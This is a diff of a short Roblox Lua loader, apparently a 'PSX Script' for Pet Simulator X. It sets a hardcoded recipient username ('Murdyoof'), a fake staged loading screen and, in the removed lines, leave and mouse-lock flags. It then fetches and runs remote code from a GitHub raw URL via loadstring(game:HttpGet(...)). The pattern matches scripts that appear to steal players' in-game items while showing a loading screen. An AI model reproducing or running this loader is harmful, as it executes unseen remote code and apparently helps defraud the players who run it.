@@ -1,19 +1,15 @@
-UserName = "Murdyoof"
+Username = "Murdyoof"
 
-_G.LoadingScreen = true
+loadingscreen = true
 
-_G.AntiLeave = true
+_G.CustomScriptName = "PSX Script!"
 
-_G.MouseLock = true 
+_G.Text1 = "Preparing Script..."
 
-_G.ScriptName = "PSX SCRIPT"
+_G.Text2 = "Loading Script..."
 
-_G.FirstText = "Preparing Script..."
+_G.Text3 = "Finishing Things Up..."
 
-_G.SecondText = "Loading Script..."
+_G.Text4 = "Almost Done..."
 
-_G.ThirdText = "Finishing Things Up..."
-
-_G.WaitingTime = 100
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PSX12345/PSX-SCRIPT/main/PSX%20SCRIPT", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
